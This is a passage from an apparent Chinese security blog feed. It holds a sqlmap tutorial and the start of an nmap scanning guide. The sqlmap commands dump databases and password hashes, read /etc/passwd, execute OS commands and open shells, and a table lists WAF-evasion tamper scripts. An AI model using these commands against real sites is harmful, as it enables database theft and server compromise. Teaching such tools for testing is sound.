class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://a.qq.com/test&quot;</span> --tamper base64encode.py<br></code></pre></td></tr></table></figure><p>对SQLmap的payload进行base64编码后再提交<br>可用的tamper脚本都位于tamper目录下, 我们也可以实现自己的tamper脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> PRIORITY<br>__priority__ = PRIORITY.NORMAL<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tamper</span>(<span class="hljs-params">payload</span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    Description of your tamper script</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    retVal = payload<br>    <span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure><p>输入是原始的SQLmap的payload, 输出是处理后的值</p><h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>当检测到存在SQL注入漏洞之后, SQLmap会帮助我们自动化枚举相关信息.</p><h4 id="枚举概况"><a href="#枚举概况" class="headerlink" title="枚举概况"></a>枚举概况</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://a.qq.com/test&quot;</span> -a -b<br></code></pre></td></tr></table></figure><p>其中:</p><ul><li>a : 枚举所有的信息, 后面会介绍有多少信息</li><li>b : 返回数据库的banner, 一般有类型,版本等信息.</li></ul><h4 id="枚举当前数据库和用户"><a href="#枚举当前数据库和用户" class="headerlink" title="枚举当前数据库和用户"></a>枚举当前数据库和用户</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://a.qq.com/test&quot;</span> --current-db --current-user --hostname --is-dba<br></code></pre></td></tr></table></figure><p>枚举以下信息:</p><ul><li>current-db: 当前程序使用的db的名字</li><li>current-user: 当前程序使用的数据库用户名</li><li>hostname: 当前DB服务器的主机名</li><li>is-dba: 当前程序所使用的数据库用户是不是dba</li></ul><h4 id="枚举数据库相关信息"><a href="#枚举数据库相关信息" class="headerlink" title="枚举数据库相关信息"></a>枚举数据库相关信息</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://a.qq.com/test&quot;</span> --<span class="hljs-built_in">users</span> --passwords --privileges --dbs<br></code></pre></td></tr></table></figure><p>枚举以下信息, 但是因为权限问题, 不一定能获取到信息:</p><ul><li>users: 数据库服务器中所有的用户</li><li>passwords: 数据库服务器中所有用户的密码hash</li><li>privileges: 数据库服务器中所有的用户权限分配</li><li>dbs: 数据库服务器中所有的数据库名字</li></ul><h4 id="指定被枚举对象"><a href="#指定被枚举对象" class="headerlink" title="指定被枚举对象"></a>指定被枚举对象</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://a.qq.com/test&quot;</span> -D 库名 -T 表名 -C 列名 -U 用户名 <span class="hljs-comment"># 后面再接上其他枚举指令</span><br></code></pre></td></tr></table></figure><p>指定被枚举的对象, 比如我们要枚举某一个库中所有的表, 那么就需要使用-D来指定库名</p><h4 id="枚举数据库相关详情"><a href="#枚举数据库相关详情" class="headerlink" title="枚举数据库相关详情"></a>枚举数据库相关详情</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://a.qq.com/test&quot;</span> --tables --columns --count<br></code></pre></td></tr></table></figure><p>枚举以下信息:</p><ul><li>tables: 枚举指定数据库中所有的表名, 需要-D</li><li>columns: 枚举指定表中所有的列名, 需要-T</li><li>count: 获取指定表中记录数, 需要-T</li></ul><h4 id="导出"><a href="#导出" class="headerlink" title="导出"></a>导出</h4><p>其实就是我们俗称的脱裤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://a.qq.com/test&quot;</span> --dump -D testDB -T testTB<br></code></pre></td></tr></table></figure><p>导出指定表中所有数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://a.qq.com/test&quot;</span> --dump-all -D testDB<br></code></pre></td></tr></table></figure><p>导出所有表的所有数据</p><h4 id="暴力枚举"><a href="#暴力枚举" class="headerlink" title="暴力枚举"></a>暴力枚举</h4><p>很多时候, 因为权限设置, 程序所使用的数据库用户并不能通过系统相关表来获取到所有的表和列, 那么我们只能通过字典进行枚举.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://a.qq.com/test&quot;</span> --tables -D testDB --common-tables<br></code></pre></td></tr></table></figure><p>通过表名的字典去尝试查询testDB中所有存在的表.<br>同样地道理<strong>common-columns</strong>来暴力猜所有的列名.<br>相关的字典分别位于: txt&#x2F;common-tables.txt和txt&#x2F;common-columns.txt中,我们可以自己维护.</p><h4 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4><p>当用户的权限和数据库服务器满足特定条件才能操作:</p><h5 id="读取数据库服务器上的文件"><a href="#读取数据库服务器上的文件" class="headerlink" title="读取数据库服务器上的文件"></a>读取数据库服务器上的文件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://a.qq.com/test&quot;</span> --file-read=/etc/passwd<br></code></pre></td></tr></table></figure><p>读取指定文件到SQLmap的session目录中去</p><h5 id="上传本地文件到数据库服务器"><a href="#上传本地文件到数据库服务器" class="headerlink" title="上传本地文件到数据库服务器"></a>上传本地文件到数据库服务器</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://a.qq.com/test&quot;</span> --file-write=本地文件路径 --file-dest=数据库服务器路径<br></code></pre></td></tr></table></figure><p>把本地一个文件上传到数据库服务器中去, 注意目标路径,数据库用户一定要有写权限</p><h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><p>相关的操作也需要数据库用户的权限, 因此也不一定能执行成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://a.qq.com/test&quot;</span> --os-cmd <span class="hljs-string">&quot;id&quot;</span><br></code></pre></td></tr></table></figure><p>执行一个系统命令, 并返回结果.<br>我们还可以使用<strong>os-shell</strong>来获取一个交互式的shell, 直接输入命令等.</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://a.qq.com/test&quot;</span> --dump-all -D testdb --dump-format HTML --output-dir /data/test<br></code></pre></td></tr></table></figure><p>设置导出的格式和session等其他输出保存的目录</p><h4 id="静默运行"><a href="#静默运行" class="headerlink" title="静默运行"></a>静默运行</h4><p>正常情况, 很多地方SQLmap都会询问我们一些选项, 在自动化的过程中,这个非常麻烦.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://a.qq.com/test&quot;</span> --batch --answers <span class="hljs-string">&quot;follow=Y,extending=N&quot;</span><br></code></pre></td></tr></table></figure><p>使用batch的话,所有提问的地方都选择默认参数. 如果你需要个别地方指定回答, 那么你可以使用answers写上多个你自己的答案.</p><h4 id="清除缓存"><a href="#清除缓存" class="headerlink" title="清除缓存"></a>清除缓存</h4><p>默认情况SQLmap会使用上一次检测的结果, 这样对于代码修复后的效果检测会存在很大的误报.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://a.qq.com/test&quot;</span> --flush-session --fresh-queries<br></code></pre></td></tr></table></figure><p>其中<strong>flush-session</strong>会清空当前URL相关的session, <strong>fresh-queries</strong>会忽略之前的查询结果,进行重新请求操作.</p><h4 id="查看注入详情"><a href="#查看注入详情" class="headerlink" title="查看注入详情"></a>查看注入详情</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://a.qq.com/test&quot;</span> -v 1<br></code></pre></td></tr></table></figure><p>设置不同详情的等级, 显示不同的内容.其中含义如下:</p><p>0：只显示python错误以及严重的信息。<br>1：同时显示基本信息和警告信息。（默认）<br>2：同时显示debug信息。<br>3：同时显示注入的payload。<br>4：同时显示HTTP请求。<br>5：同时显示HTTP响应头。<br>6：同时显示HTTP响应页面</p><h4 id="记录所有HTTP内容"><a href="#记录所有HTTP内容" class="headerlink" title="记录所有HTTP内容"></a>记录所有HTTP内容</h4><p>作为一个爱学习的好青年, 我们需要了解SQLmap都发送了什么内容, 服务器又返回了什么内容.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://a.qq.com/test&quot;</span> -t ./http.queries.txt<br></code></pre></td></tr></table></figure><h4 id="无人值守"><a href="#无人值守" class="headerlink" title="无人值守"></a>无人值守</h4><p>作为一个成功人士,我们的时间都是宝贵的, 不可能一直定在屏幕面前, 那么我们需要在SQLmap检测到SQL注入的时候主动通知我们.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://a.qq.com/test&quot;</span> --alert <span class="hljs-string">&quot;系统命令&quot;</span> --beep<br></code></pre></td></tr></table></figure><p>beep就是电脑会叫一声, 主要还是alert可以执行一个系统命令, 我们可以让它给我们发短信, 发微信.</p><h4 id="新手模式"><a href="#新手模式" class="headerlink" title="新手模式"></a>新手模式</h4><p>参数这么多,如果你记不住怎么办?</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap --wizard<br></code></pre></td></tr></table></figure><p>开启一个交互式的注入检测,你只需要跟着提示来就好了.</p><h3 id="safe"><a href="#safe" class="headerlink" title="safe"></a>safe</h3><p>参数：–safe-url,–safe-freq</p><p>有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致以后无法进行。</p><p>绕过这个策略有两种方式：</p><ul><li>–safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下。</li><li>–safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接。</li></ul><h3 id="–technique"><a href="#–technique" class="headerlink" title="–technique"></a>–technique</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#使用technique来设置具体的SQL注入技术</span><br>--technique BEUST<br><span class="hljs-comment">#解释如下</span><br>B:boolean 盲注<br>E:报错注入<br>U:联合注入<br>S:堆叠注入<br>T:时间盲注<br>Q:内联注入<br></code></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="0x02-常见用法"><a href="#0x02-常见用法" class="headerlink" title="0x02 常见用法"></a>0x02 常见用法</h2><h3 id="在URL重定向的情况下指定检测参数"><a href="#在URL重定向的情况下指定检测参数" class="headerlink" title="在URL重定向的情况下指定检测参数"></a>在URL重定向的情况下指定检测参数</h3><p>现在很多框架都将URL重写, 相关的参数不会以querystring的方式出现, 那么我们需要告诉sqlmap注入点在什么地方</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://a.qq.com/test/111*/bbb/a%INJECT HERE%&quot;</span><br></code></pre></td></tr></table></figure><p>只需要在指定的参数(Cookie,Header头里面都行)后面加上*或者%INJECT HERE%, 这样同时可以避免使用-p参数</p><h3 id="适合后台快速检测的命令"><a href="#适合后台快速检测的命令" class="headerlink" title="适合后台快速检测的命令"></a>适合后台快速检测的命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -v 2 --url=http://mysite.com/index --user-agent=SQLMAP --delay=1 --<span class="hljs-built_in">timeout</span>=15 --retries=2 --keep-alive --threads=5 --eta --batch --dbms=MySQL --os=Linux --level=5 --risk=4 --banner --is-dba --dbs --tables --technique=BEUST -s /tmp/scan_report.txt --flush-session -t /tmp/scan_trace.txt --fresh-queries<br></code></pre></td></tr></table></figure><h3 id="导出相关内容"><a href="#导出相关内容" class="headerlink" title="导出相关内容"></a>导出相关内容</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://www.sqldummywebsite.com/cgi-bin/item.cgi?item_id=15 -D sqldummywebsite -T user_info -C user_password,user_login --dump<br></code></pre></td></tr></table></figure><h3 id="清除session-重新扫描"><a href="#清除session-重新扫描" class="headerlink" title="清除session, 重新扫描"></a>清除session, 重新扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u 目标 --flush-session --fresh-queries<br></code></pre></td></tr></table></figure><h3 id="SQLMAP-HH"><a href="#SQLMAP-HH" class="headerlink" title="SQLMAP -HH"></a>SQLMAP -HH</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs bash">5,000 / 5,000<br>翻译结果<br>-h, --<span class="hljs-built_in">help</span> 显示基本帮助信息并退出<br>  -hh 显示高级帮助信息并退出<br>  --version 显示程序的版本号并退出<br>  -v VERBOSE 详细级别：0-6（默认为 1）<br><br>  目标：<br>    必须提供这些选项中的至少一个来定义<br>    目标<br><br>    -u URL，--url=URL 目标 URL（例如“http://www.site.com/vuln.php?<span class="hljs-built_in">id</span>=1”）<br>    -d DIRECT 直接连接数据库的连接字符串<br>    -l LOGFILE 从 Burp 或 WebScarab 代理日志文件中解析目标<br>    -m BULKFILE 扫描文本文件中给定的多个目标<br>    -r REQUESTFILE 从文件加载 HTTP 请求<br>    -g GOOGLEDORK 将 Google dork 结果作为目标 URL 处理<br>    -c CONFIGFILE 从配置 INI 文件加载选项<br><br>  要求：<br>    这些选项可用于指定如何连接到目标 URL<br><br>    -A AGENT, --user.. HTTP User-Agent 标头值<br>    -H HEADER, --hea.. 额外的标题（例如“X-Forwarded-For: 127.0.0.1”）<br>    --method=METHOD 强制使用给定的 HTTP 方法（例如 PUT）<br>    --data=DATA 要通过 POST 发送的数据字符串（例如“<span class="hljs-built_in">id</span>=1”）<br>    --param-del=PARA.. 用于分割参数值的字符（例如 &amp;）<br>    --cookie=COOKIE HTTP Cookie 标头值（例如“PHPSESSID=a8d127e..”）<br>    --cookie-del=COO.. 用于分割 cookie 值的字符（例如 ;）<br>    --live-cookies=L.. 用于加载最新值的实时 cookie 文件<br>    --load-cookies=L.. 包含 Netscape/wget 格式的 cookie 的文件<br>    --drop-set-cookie 忽略响应中的 Set-Cookie 标头<br>    --mobile 通过HTTP User-Agent header 模仿智能手机<br>    --random-agent 使用随机选择的 HTTP User-Agent 标头值<br>    --host=HOST HTTP 主机标头值<br>    --referer=REFERER HTTP 引用头值<br>    --headers=HEADERS 额外的标题（例如“Accept-Language: fr\nETag: 123”）<br>    --auth-type=AUTH.. HTTP 认证类型（Basic、Digest、Bearer、...）<br>    --auth-cred=AUTH.. HTTP 身份验证凭据（名称：密码）<br>    --auth-file=AUTH.. HTTP 认证 PEM 证书/私钥文件<br>    --ignore-code=IG.. 忽略（有问题的）HTTP 错误代码（例如 401）<br>    --ignore-proxy 忽略系统默认代理设置<br>    --ignore-redirects 忽略重定向尝试<br>    --ignore-timeouts 忽略连接超时<br>    --proxy=PROXY 使用代理连接到目标 URL<br>    --proxy-cred=PRO.. 代理身份验证凭据（名称：密码）<br>    --proxy-file=PRO.. 从文件加载代理列表<br>    --proxy-freq=PRO.. 从给定列表更改代理之间的请求<br>    --tor 使用 Tor 匿名网络<br>    --tor-port=TORPORT 设置 Tor 代理端口不是默认端口<br>    --tor-type=TORTYPE 设置 Tor 代理类型（HTTP、SOCKS4 或 SOCKS5（默认））<br>    --check-tor 检查 Tor 是否正确使用<br>    --delay=DELAY 每个 HTTP 请求之间的延迟秒数<br>    --<span class="hljs-built_in">timeout</span>=TIMEOUT 连接超时前等待的秒数（默认 30）<br>    --retries=RETRIES 连接超时重试（默认3）<br>    --retry-on=RETRYON 对正则表达式匹配内容的重试请求（例如“drop”）<br>    --randomize=RPARAM 随机更改给定参数的值<br>    --safe-url=SAFEURL 测试时经常访问的URL地址<br>    --safe-post=SAFE.. POST 数据发送到一个安全的 URL<br>    --safe-req=SAFER.. 从文件加载安全的 HTTP 请求<br>    --safe-freq=SAFE.. 访问安全 URL 之间的定期请求<br>    --skip-urlencode 跳过有效载荷数据的 URL 编码<br>    --csrf-token=CSR.. 用于保存anti-CSRF令牌的参数<br>    --csrf-url=CSRFURL 提取反 CSRF 令牌要访问的 URL 地址<br>    --csrf-method=CS.. 在反 CSRF 令牌页面访问期间使用的 HTTP 方法<br>    --csrf-retries=C.. 重试反 CSRF 令牌检索（默认 0）<br>    --force-ssl 强制使用 SSL/HTTPS<br>    --chunked 使用 HTTP 分块传输编码 (POST) 请求<br>    --hpp 使用HTTP参数污染方式<br>    --<span class="hljs-built_in">eval</span>=EVALCODE 在请求之前评估提供的 Python 代码（例如<br>                        “导入 hashlib;id2=hashlib.md5(<span class="hljs-built_in">id</span>).hexdigest()”)<br><br>  优化：<br>    这些选项可以用来优化sqlmap的性能<br><br>    -o 打开所有优化开关<br>    --predict-output 预测常见查询输出<br>    --keep-alive 使用持久的 HTTP(s) 连接<br>    --null-connection 在没有实际 HTTP 响应正文的情况下检索页面长度<br>    --threads=THREADS 最大并发 HTTP(s) 请求数（默认 1）<br><br>  注射：<br>    这些选项可用于指定要测试的参数，<br>    提供自定义注入负载和可选的篡改脚本<br>    <br>    -p TESTPARAMETER 可测试参数<br>    --skip=SKIP 跳过给定参数的测试<br>    --skip-static 跳过看起来不是动态的测试参数<br>    --param-exclude=..重新<br></code></pre></td></tr></table></figure><h2 id="0x03-tamper"><a href="#0x03-tamper" class="headerlink" title="0x03 tamper"></a>0x03 tamper</h2><p><strong>常用脚本如下</strong>：</p><table><thead><tr><th>序号</th><th>脚本名称</th><th>注释</th></tr></thead><tbody><tr><td>1</td><td>0x2char</td><td>将每个编码后的字符转换为等价表达</td></tr><tr><td>2</td><td>apostrophemask</td><td>单引号替换为Utf8字符</td></tr><tr><td>3</td><td>apostrophenullencode</td><td>替换双引号为%00%27</td></tr><tr><td>4</td><td>appendnullbyte</td><td>有效代码后添加%00</td></tr><tr><td>5</td><td>base64encode</td><td>使用base64编码</td></tr><tr><td>6</td><td>between</td><td>比较符替换为between</td></tr><tr><td>7</td><td>bluecoat</td><td>空格替换为随机空白字符，等号替换为like</td></tr><tr><td>8</td><td>chardoubleencode</td><td>双url编码</td></tr><tr><td>9</td><td>charencode</td><td>将url编码</td></tr><tr><td>10</td><td>charunicodeencode</td><td>使用unicode编码</td></tr><tr><td>11</td><td>charunicodeescape</td><td>以指定的payload反向编码未编码的字符</td></tr><tr><td>12</td><td>commalesslimit</td><td>改变limit语句的写法</td></tr><tr><td>13</td><td>commalessmid</td><td>改变mid语句的写法</td></tr><tr><td>14</td><td>commentbeforeparentheses</td><td>在括号前加内联注释</td></tr><tr><td>15</td><td>concat2concatws</td><td>替换CONCAT为CONCAT_WS</td></tr><tr><td>16</td><td>equaltolike</td><td>等号替换为like</td></tr><tr><td>17</td><td>escapequotes</td><td>双引号替换为\\</td></tr><tr><td>18</td><td>greatest</td><td>大于号替换为greatest</td></tr><tr><td>19</td><td>halfversionedmorekeywords</td><td>在每个关键字前加注释</td></tr><tr><td>20</td><td>htmlencode</td><td>html编码所有非字母和数字的字符</td></tr><tr><td>21</td><td>ifnull2casewhenisnull</td><td>改变ifnull语句的写法</td></tr><tr><td>22</td><td>ifnull2ifisnull</td><td>替换ifnull为if(isnull(A))</td></tr><tr><td>23</td><td>informationschemacomment</td><td>标示符后添加注释</td></tr><tr><td>24</td><td>least</td><td>替换大于号为least</td></tr><tr><td>25</td><td>lowercase</td><td>全部替换为小写值</td></tr><tr><td>26</td><td>modsecurityversioned</td><td>空格替换为查询版本的注释</td></tr><tr><td>27</td><td>modsecurityzeroversioned</td><td>添加完整的查询版本的注释</td></tr><tr><td>28</td><td>multiplespaces</td><td>添加多个空格</td></tr><tr><td>29</td><td>nonrecursivereplacement</td><td>替换预定义的关键字</td></tr><tr><td>30</td><td>overlongutf8</td><td>将所有字符转义为utf8</td></tr><tr><td>31</td><td>overlongutf8more</td><td>以指定的payload转换所有字符</td></tr><tr><td>32</td><td>percentage</td><td>每个字符前添加%</td></tr><tr><td>33</td><td>plus2concat</td><td>将加号替换为concat函数</td></tr><tr><td>34</td><td>plus2fnconcat</td><td>将加号替换为ODBC函数{fn CONCAT()}</td></tr><tr><td>35</td><td>randomcase</td><td>字符大小写随机替换</td></tr><tr><td>36</td><td>randomcomments</td><td>&#x2F;**&#x2F;分割关键字</td></tr><tr><td>37</td><td>securesphere</td><td>添加某字符串</td></tr><tr><td>38</td><td>sp_password</td><td>追加sp_password字符串</td></tr><tr><td>39</td><td>space2comment</td><td>空格替换为&#x2F;**&#x2F;</td></tr><tr><td>40</td><td>space2dash</td><td>空格替换为–加随机字符</td></tr><tr><td>41</td><td>space2hash</td><td>空格替换为#加随机字符</td></tr><tr><td>42</td><td>space2morecomment</td><td>空格替换为&#x2F;<strong>_</strong>&#x2F;</td></tr><tr><td>43</td><td>space2morehash</td><td>空格替换为#加随机字符及换行符</td></tr><tr><td>44</td><td>space2mssqlblank</td><td>空格替换为其他空符号</td></tr><tr><td>45</td><td>space2mssqlhash</td><td>空格替换为%23%0A</td></tr><tr><td>46</td><td>space2mysqlblank</td><td>空格替换为其他空白符号</td></tr><tr><td>47</td><td>space2mysqldash</td><td>空格替换为–%0A</td></tr><tr><td>48</td><td>space2plus</td><td>空格替换为加号</td></tr><tr><td>49</td><td>space2randomblank</td><td>空格替换为备选字符集中的随机字符</td></tr><tr><td>50</td><td>symboliclogical</td><td>AND和OR替换为&amp;&amp;和||</td></tr><tr><td>51</td><td>unionalltounion</td><td>union all select替换为union select</td></tr><tr><td>52</td><td>unmagicquotes</td><td>宽字符绕过GPC</td></tr><tr><td>53</td><td>uppercase</td><td>全部替换为大写值</td></tr><tr><td>54</td><td>varnish</td><td>添加HTTP头</td></tr><tr><td>55</td><td>versionedkeywords</td><td>用注释封装每个非函数的关键字</td></tr><tr><td>56</td><td>versionedmorekeywords</td><td>使用注释绕过</td></tr><tr><td>57</td><td>xforwardedfor</td><td>添加伪造的HTTP头</td></tr></tbody></table><h2 id="0x04-附录"><a href="#0x04-附录" class="headerlink" title="0x04 附录"></a>0x04 附录</h2><ol><li><a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">SQLmap官方使用手册英文</a></li><li><a href="http://www.vuln.cn/2035">SQLmap用户手册详解【实用版】</a></li><li><a href="https://www.owasp.org/index.php/Automated_Audit_using_SQLMap">OWASP基于SQLmap的自动化审计</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 工具 </tag>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工具使用-NMAP</title>
      <link href="/2022/04/24/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8-NMAP/"/>
      <url>/2022/04/24/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8-NMAP/</url>
      
        <content type="html"><![CDATA[<h2 id="nmap-作用"><a href="#nmap-作用" class="headerlink" title="nmap 作用"></a>nmap 作用</h2><ul><li>主机发现-识别网络上的主机。例如列出响应TCP和&#x2F;或ICMP请求或打开特定端口的主机。</li><li>端口扫描 - 枚举目标主机上的开放端口。</li><li>版本检测 - 询问远程设备上的网络服务以确定应用程序名称和版本号。</li><li>OS检测 - 确定网络设备的操作系统和硬件特性。</li><li>软件版本检测脆弱性的漏洞（Nmap的脚本）</li></ul><h2 id="0x01-用法"><a href="#0x01-用法" class="headerlink" title="0x01 用法"></a>0x01 用法</h2><h3 id="扫描目标"><a href="#扫描目标" class="headerlink" title="扫描目标"></a>扫描目标</h3><p>nmap接受的输入可以有单IP,域名,网段和IP列表文件.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 扫描单个ip</span><br>nmap 127.0.0.1<br><span class="hljs-comment"># 扫描一个ip端</span><br>nmap 192.168.2.1-25<br><span class="hljs-comment"># 扫描一个子网段</span><br>nmap 192.168.2.0/24<br><span class="hljs-comment"># 扫描一个域名</span><br>nmap www.test.com<br><span class="hljs-comment"># 扫描文件列表中IP</span><br>nmap -iL ips.txt<br><span class="hljs-comment"># 排除指定ip, 不扫描192.168.3.1</span><br>nmap 192.168.3.0/24 --exclude 192.168.3.1<br></code></pre></td></tr></table></figure><h3 id="端口选项"><a href="#端口选项" class="headerlink" title="端口选项"></a>端口选项</h3><p>默认nmap会扫描1000个端口, 但是可以用过-p参数来设置.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 扫描常见的100哥端口, 快速扫描模式</span><br>nmap -F 192.168.3.1<br><span class="hljs-comment"># 扫描指定端口, 可以使单个也可以是多个</span><br>nmap -p 22,23,443 192.168.3.1<br><span class="hljs-comment"># 扫描所有端口1-65535 </span><br>nmap -p- 192.168.3.1<br></code></pre></td></tr></table></figure><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>nmap在对主机进行扫描前, 通常会通过ping命令来发现主机是否存活, 主要用来优化扫描速度. 